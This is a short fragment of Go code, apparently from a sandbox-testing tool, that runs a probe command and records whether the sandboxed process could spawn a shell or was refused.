	err := cmd.Run()
	if err == nil {
		r.Verdict = model.VerdictAllowed
		r.Detail = "the sandboxed process can spawn a shell"
		return r
	}
	r.Verdict, r.Errno = classify(err)
	r.Err = err.Error()
	r.Detail = "spawning a shell was refused"
	return r
}
